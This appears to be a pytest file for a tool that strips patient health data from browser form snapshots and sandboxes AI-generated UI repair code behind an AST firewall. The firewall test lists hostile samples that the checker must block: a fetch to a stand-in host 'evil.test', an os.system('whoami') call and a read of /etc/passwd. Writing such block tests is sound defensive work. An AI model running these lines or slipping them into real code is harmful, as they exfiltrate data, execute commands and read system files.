"""Tests for Zero-PHI Structural Twin privacy guarantees and AST-sandboxed symbolic coding repair."""

from __future__ import annotations

import json

from playwright.sync_api import sync_playwright

from openadapt_kernel.macro import ControlSchema
from openadapt_kernel.zero_phi_repair import (
    execute_zero_phi_coding_repair,
    export_zero_phi_dom_twin,
    verify_symbolic_repair_ast,
)


def test_zero_phi_dom_twin_strips_100_percent_of_phi_in_labels_values_and_ids() -> None:
    secret_phi = [
        "Alice_Wonderland",
        "SSN-999-88-7777",
        "MRN88442211",
        "HIV_Positive_Stage2",
        "416-555-0199",
        "alice.secret@clinic.ca",
    ]
    controls = [
        ControlSchema(
            control_index=0,
            tag="input",
            input_type="text",
            role="textbox",
            label="Patient Name Alice_Wonderland SSN-999-88-7777",
            placeholder="MRN88442211 416-555-0199",
            name="alice.secret@clinic.ca",
            element_id="HIV_Positive_Stage2",
            testid="secret-testid-Alice_Wonderland",
            in_modal=True,
            selector="#HIV_Positive_Stage2",
            value="Alice_Wonderland HIV_Positive_Stage2",
            disabled=False,
        )
    ]
    twin = export_zero_phi_dom_twin(controls)
    serialized = json.dumps(twin)
    for token in secret_phi:
        assert token not in serialized, f"Leaked sensitive token {token!r} in twin: {serialized}"
    assert "name" in twin[0]["ui_chrome_tokens"]
    assert "<OPAQUE>" in twin[0]["ui_chrome_tokens"]


def test_symbolic_ast_firewall_blocks_exfiltration_imports_and_dunders() -> None:
    allowed = frozenset({"$title", "$body"})

    safe_code = """
def repair(ui, vars):
    ui.fill(0, vars["$title"])
    ui.check(2, True)
    ui.click(3)
"""
    assert verify_symbolic_repair_ast(safe_code, allowed).ok

    attacks = [
        "import os\ndef repair(ui, vars):\n    ui.click(0)",
        "def repair(ui, vars):\n    ui._page.evaluate('fetch(\"https://evil.test\")')",
        "def repair(ui, vars):\n    __import__('os').system('whoami')",
        "def repair(ui, vars):\n    ui.fill(0, vars['$undeclared_secret'])",
        "def repair(ui, vars):\n    open('/etc/passwd').read()",
    ]
    for bad in attacks:
        res = verify_symbolic_repair_ast(bad, allowed)
        assert not res.ok, f"AST firewall failed to block: {bad}"


def test_live_chromium_zero_phi_coding_repair_resolves_disabled_submit_schema_change() -> None:
    html = """<!doctype html><html><body>
    <div role="dialog" style="display:block;width:500px;height:300px;">
      <label for="n">Cookbook Name</label><input id="n" type="text" />
      <label for="ack">Public</label><input id="ack" type="checkbox" />
      <button id="save" type="submit" disabled>Save</button>
    </div>
    <div id="saved"></div>
    <script>
      const n = document.getElementById('n');
      const ack = document.getElementById('ack');
      const save = document.getElementById('save');
      const sync = () => { save.disabled = !(n.value.length > 0 && ack.checked); };
      n.addEventListener('input', sync);
      ack.addEventListener('change', sync);
      save.onclick = () => { document.getElementById('saved').innerText = 'SAVED:' + n.value; };
    </script></body></html>"""

    captured_twin = []

    def mock_frontier_coder(twin, var_keys, safe_err):
        captured_twin.extend(twin)
        return """
def repair(ui, vars):
    ui.fill(0, vars["$patient_secret"])
    ui.check(1, True)
    ui.click(2)
"""

    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        page = browser.new_page()
        page.set_content(html)

        res = execute_zero_phi_coding_repair(
            page,
            private_vars={"$patient_secret": "Sensitive Oncology Protocol #9921"},
            structural_error="Save button disabled on Sensitive Oncology Protocol #9921",
            coding_agent_fn=mock_frontier_coder,
            readback_oracle=lambda p: "SAVED:Sensitive Oncology Protocol #9921" in p.locator("#saved").inner_text(),
        )
        assert res.verified
        assert "Oncology" not in json.dumps(captured_twin)
        assert "9921" not in json.dumps(captured_twin)
        browser.close()
